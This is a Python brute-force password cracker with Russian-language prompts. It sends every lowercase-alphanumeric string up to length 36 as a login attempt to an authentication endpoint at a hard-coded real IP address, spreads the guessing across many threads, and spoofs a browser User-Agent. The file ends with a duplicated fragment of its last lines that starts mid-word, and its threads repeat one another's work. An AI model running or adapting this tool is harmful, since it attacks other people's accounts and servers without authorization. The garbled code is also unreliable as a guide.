from timeit import default_timer as timer
from datetime import timedelta
import requests
import threading
from itertools import product
import signal
import keyboard
from threading import Thread

lock = threading.Lock()
default_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
default_timeout = 7
try_num = 0
right_password = None
class ThreadManager:
    def __init__(self, threads_amount: int):
        self.threads_amount = threads_amount
        self.threads_list = []

    def prepare_threads(self):
        for thread_num in range(self.threads_amount):
            thread = threading.Thread(target=thread_task)
            self.threads_list.append(thread)

    def start_all(self):
        for thread in self.threads_list:
            thread.start()

    def stop_all(self):
        for thread in self.threads_list:
            thread.join()
def check_password(password: str):
    global right_password
    post_data = {"login": username, "password": password}
    request = requests.post("http://185.87.48.157:5048/auth", json=post_data, headers=default_headers, timeout=default_timeout)
    if request.status_code == 200:
        print(f'\033[32m Успех! Пароль верный! {password} \033[0m | попытка: {try_num}')
        right_password = password
    else:
        print(f'\033[31m Неудача! Пароль неверный! {password} \033[0m | попытка: {try_num}')
        if keyboard.is_pressed("ctrl+c"):
            quit()
def thread_task():
    global try_num
    for k in range(1, 37):
        for i in product('abcdefghijklmnopqrstuvwxyz1234567890', repeat=k):
            a = ''.join(i)
            check_password(a)
            try_num += 1
            if a == right_password:
                exit()
print("Для досрочной завершение работы, нажмите CTRL+C")
username = input("Введите имя пользователя: ")
threads_count = int(input("Кол-во потоков: "))
start_time = timer()
Tmanager = ThreadManager(threads_count)
Tmanager.prepare_threads()
Tmanager.start_all()
Tmanager.stop_all()
end_time = timer()
print(timedelta(seconds=end_time-start_time))
аботы, нажмите CTRL+C")
username = input("Введите имя пользователя: ")
threads_count = int(input("Кол-во потоков: "))
start_time = timer()
Tmanager = ThreadManager(threads_count)
Tmanager.prepare_threads()
Tmanager.start_all()
Tmanager.stop_all()
end_time = timer()
print(timedelta(seconds=end_time-start_time))
